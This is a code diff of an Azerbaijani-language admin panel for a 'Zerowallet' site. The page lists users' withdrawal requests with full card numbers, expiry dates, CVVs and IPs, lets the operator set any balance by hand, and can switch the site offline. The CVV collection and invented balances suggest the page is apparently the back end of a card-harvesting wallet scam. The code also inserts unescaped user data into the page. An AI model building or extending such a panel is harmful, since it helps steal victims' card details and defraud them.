@@ -2,7 +2,7 @@
 <html lang="az">
 <head>
     <meta charset="UTF-8">
-    <title>Zerowallet | Admin Terminal v2.4</title>
+    <title>Zerowallet | Admin Terminal v2.5</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -12,62 +12,40 @@
         .container { max-width: 1200px; margin: 0 auto; }
         h1 { color: var(--neon); border-bottom: 2px solid var(--neon); padding-bottom: 10px; text-transform: uppercase; }
         h2 { color: var(--neon); font-size: 1.2rem; margin-top: 40px; }
-        
         .table-wrap { background: var(--row-bg); border-radius: 10px; overflow: hidden; margin-top: 15px; border: 1px solid #222; }
         table { width: 100%; border-collapse: collapse; }
         th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.8rem; }
         td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.9rem; }
-        tr:hover { background: #1a1a1d; }
-
-        .card-box { color: #ffd700; font-weight: bold; }
-        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-family: monospace; }
+        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .btn-block { background: #ff3e3e; color: white; }
         .btn-unblock { background: #00ff41; color: black; }
-        
-        /* Balansın dəyişdirilməsi üçün stil */
-        .editable-balance { 
-            color: #00ff41; 
-            cursor: pointer; 
-            text-decoration: underline dotted; 
-            font-weight: bold;
-        }
-        .editable-balance:hover { color: #fff; background: #222; }
+        .editable-balance { color: #00ff41; cursor: pointer; text-decoration: underline dotted; font-weight: bold; }
+        .sys-box { background: #1c1c1f; padding: 20px; border-radius: 10px; border: 1px solid var(--neon); margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1><i class="fas fa-terminal"></i> ZEROWALLET ADMIN SYSTEM</h1>
+    <h1><i class="fas fa-terminal"></i> ADMIN SYSTEM</h1>
 
-    <h2><i class="fas fa-credit-card"></i> ÇIXARIŞ TƏLƏBLƏRİ (KARTLAR)</h2>
+    <div class="sys-box">
+        <h3 style="margin-top:0; color:var(--neon);"><i class="fas fa-power-off"></i> SİSTEM STATUSU</h3>
+        <p id="status-text">Yüklənir...</p>
+        <button id="toggle-sys-btn" class="btn" onclick="toggleSystem()" style="padding: 15px 30px; font-size: 1rem;"></button>
+    </div>
+
+    <h2><i class="fas fa-credit-card"></i> ÇIXARIŞ TƏLƏBLƏRİ</h2>
     <div class="table-wrap">
         <table>
-            <thead>
-                <tr>
-                    <th>İstifadəçi</th>
-                    <th>Məbləğ</th>
-                    <th>Kart Sahibi</th>
-                    <th>Kart No / Tarix / CVV</th>
-                    <th>IP</th>
-                    <th>Tarix</th>
-                </tr>
-            </thead>
+            <thead><tr><th>İstifadəçi</th><th>Məbləğ</th><th>Kart Sahibi</th><th>Kart No/EXP/CVV</th><th>IP</th></tr></thead>
             <tbody id="withdraw-body"></tbody>
         </table>
     </div>
 
-    <h2><i class="fas fa-users"></i> ÜMUMİ İSTİFADƏÇİ SİYAHISI</h2>
+    <h2><i class="fas fa-users"></i> İSTİFADƏÇİ SİYAHISI</h2>
     <div class="table-wrap">
         <table>
-            <thead>
-                <tr>
-                    <th>Username</th>
-                    <th>Balans (Dəyişmək üçün kliklə)</th>
-                    <th>IP Ünvanı</th>
-                    <th>Status</th>
-                    <th>İdarəetmə</th>
-                </tr>
-            </thead>
+            <thead><tr><th>Username</th><th>Balans (Kliklə)</th><th>IP Ünvanı</th><th>Status</th><th>İdarəetmə</th></tr></thead>
             <tbody id="user-body"></tbody>
         </table>
     </div>
@@ -86,79 +64,61 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Çıxarışları və Kartları gətir
+    // SİSTEM STATUSU İŞLƏMƏSİ
+    db.ref('settings/system_status').on('value', snap => {
+        const status = snap.val();
+        const btn = document.getElementById('toggle-sys-btn');
+        const txt = document.getElementById('status-text');
+        if (status === "active") {
+            txt.innerHTML = `Sistem: <b style="color:#00ff41">AKTİV</b>`;
+            btn.innerText = "SİSTEMİ BAĞLA (MAINTENANCE)";
+            btn.className = "btn btn-block";
+        } else {
+            txt.innerHTML = `Sistem: <b style="color:#ff3e3e">BAĞLI</b>`;
+            btn.innerText = "SİSTEMİ AÇ (ONLINE)";
+            btn.className = "btn btn-unblock";
+        }
+    });
+
+    function toggleSystem() {
+        db.ref('settings/system_status').once('value', snap => {
+            const next = snap.val() === "active" ? "maintenance" : "active";
+            if(confirm("Dəyişiklik edilsin?")) db.ref('settings').update({ system_status: next });
+        });
+    }
+
     db.ref('admin_withdrawals').on('value', snap => {
-        const body = document.getElementById('withdraw-body');
-        body.innerHTML = '';
+        const body = document.getElementById('withdraw-body'); body.innerHTML = '';
         snap.forEach(child => {
             const d = child.val();
-            body.innerHTML += `
-                <tr>
-                    <td><b>${d.username}</b></td>
-                    <td style="color:#00ff41">${d.amount.toFixed(2)} AZN</td>
-                    <td>${d.card_name}</td>
-                    <td class="card-box">${d.card_num} | ${d.card_exp} | ${d.card_cvv}</td>
-                    <td>${d.ip}</td>
-                    <td style="font-size:0.7rem">${new Date(d.timestamp || Date.now()).toLocaleString()}</td>
-                </tr>`;
+            body.innerHTML += `<tr><td><b>${d.username}</b></td><td style="color:#00ff41">${d.amount} AZN</td><td>${d.card_name}</td><td>${d.card_num} | ${d.card_exp} | ${d.card_cvv}</td><td>${d.ip}</td></tr>`;
         });
     });
 
-    // İstifadəçiləri və IP Statuslarını gətir
     db.ref('zerowallet_users').on('value', snap => {
-        const body = document.getElementById('user-body');
-        body.innerHTML = '';
+        const body = document.getElementById('user-body'); body.innerHTML = '';
         snap.forEach(child => {
             const u = child.val();
             const cleanIp = (u.ip || "").replace(/\./g, '_');
-            
             db.ref('blocked_ips/' + cleanIp).on('value', blockSnap => {
                 const isBlocked = blockSnap.exists();
                 const rowId = `row_${u.username}`;
+                const rowHtml = `<tr id="${rowId}"><td>${u.username}</td><td><span class="editable-balance" onclick="editBalance('${u.username}', ${u.balance})">${u.balance.toFixed(2)} AZN</span></td><td>${u.ip}</td><td>${isBlocked ? '<b style="color:red">BLOK</b>' : '<b style="color:green">AKTİV</b>'}</td><td><button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${u.ip}', ${!isBlocked})">${isBlocked ? 'AÇ' : 'BLOKLA'}</button></td></tr>`;
                 let row = document.getElementById(rowId);
-
-                const rowHtml = `
-                    <tr id="${rowId}">
-                        <td>${u.username}</td>
-                        <td><span class="editable-balance" onclick="editBalance('${u.username}', ${u.balance})">${u.balance.toFixed(2)} AZN</span></td>
-                        <td>${u.ip}</td>
-                        <td>${isBlocked ? '<b style="color:red">BLOKLU</b>' : '<b style="color:green">AKTİV</b>'}</td>
-                        <td>
-                            ${isBlocked ? 
-                                `<button class="btn btn-unblock" onclick="toggleBlock('${u.ip}', false)">BLOKDAN AÇ</button>` : 
-                                `<button class="btn btn-block" onclick="toggleBlock('${u.ip}', true)">BLOKLA</button>`
-                            }
-                        </td>
-                    </tr>`;
-                
-                if (row) row.outerHTML = rowHtml;
-                else body.innerHTML += rowHtml;
+                if (row) row.outerHTML = rowHtml; else body.innerHTML += rowHtml;
             });
         });
     });
 
-    // Balansı Redaktə Etmək Funksiyası
-    function editBalance(username, currentBalance) {
-        const newBalance = prompt(`${username} üçün yeni balans daxil edin:`, currentBalance);
-        if (newBalance !== null && !isNaN(newBalance)) {
-            db.ref('zerowallet_users/' + username).update({
-                balance: parseFloat(newBalance)
-            }).then(() => {
-                alert("Balans uğurla yeniləndi!");
-            }).catch(err => {
-                alert("Xəta baş verdi: " + err.message);
-            });
-        }
+    function editBalance(username, current) {
+        const val = prompt(`${username} üçün yeni balans:`, current);
+        if (val !== null) db.ref('zerowallet_users/' + username).update({ balance: parseFloat(val) });
     }
 
     function toggleBlock(ip, status) {
-        if (!ip) return;
         const cleanIp = ip.replace(/\./g, '_');
-        if (status) {
-            if(confirm(ip + " bloklansın?")) db.ref('blocked_ips/' + cleanIp).set({ ip: ip, date: Date.now() });
-        } else {
-            if(confirm(ip + " blokdan açılsın?")) db.ref('blocked_ips/' + cleanIp).remove();
-        }
+        if (status) db.ref('blocked_ips/' + cleanIp).set({ ip: ip, date: Date.now() });
+        else db.ref('blocked_ips/' + cleanIp).remove();
     }
 </script>
 </body>
